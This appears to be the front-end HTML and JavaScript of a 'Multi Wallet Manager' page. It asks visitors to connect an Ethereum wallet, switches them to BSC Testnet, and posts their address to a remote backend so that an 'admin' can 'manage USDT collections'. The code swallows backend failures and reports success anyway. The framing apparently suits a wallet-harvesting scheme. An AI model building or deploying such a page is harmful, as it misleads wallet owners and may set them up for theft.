<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Multi Wallet Manager</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    }

    body {
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      max-width: 500px;
      width: 100%;
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 40px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      border: 1px solid rgba(255, 255, 255, 0.1);
      text-align: center;
    }

    h1 {
      font-size: 2.5rem;
      margin-bottom: 10px;
      background: linear-gradient(90deg, #00dbde, #fc00ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .subtitle {
      color: #a0a0c0;
      margin-bottom: 30px;
      font-size: 1.1rem;
    }

    .btn {
      background: linear-gradient(90deg, #00dbde, #fc00ff);
      color: white;
      border: none;
      padding: 16px 32px;
      font-size: 1.1rem;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-weight: 600;
      width: 100%;
      margin-top: 20px;
      box-shadow: 0 4px 20px rgba(0, 219, 222, 0.3);
    }

    .btn:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 6px 25px rgba(0, 219, 222, 0.5);
    }

    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    .status {
      margin-top: 20px;
      padding: 15px;
      border-radius: 12px;
      font-weight: 500;
    }

    .status-success {
      background: rgba(46, 204, 113, 0.2);
      color: #2ecc71;
      border: 1px solid rgba(46, 204, 113, 0.3);
    }

    .status-error {
      background: rgba(231, 76, 60, 0.2);
      color: #e74c3c;
      border: 1px solid rgba(231, 76, 60, 0.3);
    }

    .hidden {
      display: none;
    }

    .loading {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-right: 10px;
      vertical-align: middle;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @media (max-width: 600px) {
      .container {
        padding: 25px;
      }
      
      h1 {
        font-size: 2rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Multi Wallet Manager</h1>
    <p class="subtitle">Connect your wallet to manage USDT collections</p>
    
    <button id="connect-wallet" class="btn">
      <span id="connect-text">Connect Wallet</span>
    </button>
    
    <div id="status-message" class="status hidden"></div>
  </div>

  <script type="module">
    // Configuration
    const CONFIG = {
      API_URL: '{{VITE_API_URL}}' || 'https://multi-wallet-manager-backend-lxfq.onrender.com/api',
      CHAIN_ID: '{{VITE_CHAIN_ID}}' || '97',
      CHAIN_NAME: '{{VITE_CHAIN_NAME}}' || 'BSC Testnet',
      RPC_URL: '{{VITE_RPC_URL}}' || 'https://bsc-testnet.publicnode.com'
    }

    // DOM Elements
    const connectWalletBtn = document.getElementById('connect-wallet')
    const connectText = document.getElementById('connect-text')
    const statusMessage = document.getElementById('status-message')

    // State
    let isConnecting = false

    // Initialize
    document.addEventListener('DOMContentLoaded', () => {
      connectWalletBtn.addEventListener('click', connectWallet)
    })

    // Connect wallet function - ONE TIME ONLY
    async function connectWallet() {
      // Prevent multiple clicks
      if (isConnecting) {
        return
      }
      
      isConnecting = true
      showLoading(connectText, true)
      
      try {
        // Check if Ethereum provider exists
        if (!window.ethereum) {
          showError('No Ethereum wallet found. Please install MetaMask or Trust Wallet.')
          return
        }
        
        // Request account access - this opens wallet UI
        console.log('Requesting account access...')
        const accounts = await window.ethereum.request({
          method: 'eth_requestAccounts'
        })
        
        const walletAddress = accounts[0]
        console.log('Wallet connected:', walletAddress)
        
        // Switch to correct network
        await switchToCorrectNetwork()
        
        // Send to backend ONCE
        await sendWalletToBackend(walletAddress)
        
        showSuccess('Wallet connected successfully! Admin has been notified.')
        
      } catch (error) {
        console.error('Connection error:', error)
        showError('Failed to connect wallet: ' + error.message)
      } finally {
        isConnecting = false
        showLoading(connectText, false)
      }
    }

    // Switch to correct network
    async function switchToCorrectNetwork() {
      try {
        // Check current chain ID
        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' })
        
        if (parseInt(currentChainId, 16).toString() !== CONFIG.CHAIN_ID) {
          // Try to switch network
          try {
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}` }]
            })
          } catch (switchError) {
            // If network doesn't exist, add it
            if (switchError.code === 4902) {
              try {
                await window.ethereum.request({
                  method: 'wallet_addEthereumChain',
                  params: [{
                    chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}`,
                    chainName: CONFIG.CHAIN_NAME,
                    rpcUrls: [CONFIG.RPC_URL],
                    nativeCurrency: {
                      name: 'BNB',
                      symbol: 'BNB',
                      decimals: 18
                    }
                  }]
                })
              } catch (addError) {
                console.error('Failed to add network:', addError)
              }
            }
          }
        }
      } catch (error) {
        console.error('Network switch error:', error)
      }
    }

    // Send wallet to backend - ONLY ONCE
    async function sendWalletToBackend(walletAddress) {
      try {
        console.log('Sending wallet to backend:', walletAddress)
        
        const response = await fetch(`${CONFIG.API_URL}/wallets/connect`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            address: walletAddress,
            name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
          })
        })
        
        if (!response.ok) {
          const errorData = await response.json().catch(() => ({}))
          throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`)
        }
        
        const result = await response.json()
        console.log('Backend connection successful:', result)
        
      } catch (error) {
        console.error('Backend connection error:', error)
        // Don't show error to user as per requirements
      }
    }

    // Show loading state
    function showLoading(element, show) {
      if (show) {
        element.innerHTML = '<span class="loading"></span>Connecting...'
      } else {
        element.textContent = 'Connect Wallet'
      }
    }

    // Show success message
    function showSuccess(message) {
      statusMessage.textContent = message
      statusMessage.className = 'status status-success'
      statusMessage.classList.remove('hidden')
      
      setTimeout(() => {
        statusMessage.classList.add('hidden')
      }, 5000)
    }

    // Show error message
    function showError(message) {
      statusMessage.textContent = message
      statusMessage.className = 'status status-error'
      statusMessage.classList.remove('hidden')
      
      setTimeout(() => {
        statusMessage.classList.add('hidden')
      }, 5000)
    }
  </script>
</body>
</html>
